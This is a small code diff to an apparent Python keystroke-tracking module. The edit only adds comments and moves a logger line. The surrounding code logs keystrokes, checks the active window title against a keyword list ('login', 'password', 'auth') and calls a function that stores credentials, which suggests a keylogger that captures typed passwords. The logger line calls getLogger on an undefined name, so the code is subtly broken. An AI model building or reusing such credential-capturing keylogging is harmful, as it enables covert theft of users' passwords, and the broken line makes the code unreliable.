@@ -13,15 +13,19 @@ from storage.db import log_keystrokes_batch
 from tracker.window_tracker import get_active_window
 from storage.security import encrypt_and_store_credential
 
+# Initialize logger for keystroke tracking
+logger = logger.getLogger("KEYSTROKE")
+
+# Constants for sensitive input detection
 SENSITIVE_KEYWORDS = ["login", "sign in", "password", "auth"]
 BATCH_SIZE = 20
 FLUSH_INTERVAL = 1.0  # seconds
 
+# Global variables for keystroke logging
 event_queue = queue.Queue()
 keystroke_buffer = []
 buffer_lock = threading.RLock()
 typed_buffer = []
-logger = logger.getLogger("KEYSTROKE")
 
 def is_sensitive_window(title: Optional[str]) -> bool:
     """Return True if the window title suggests sensitive input."""
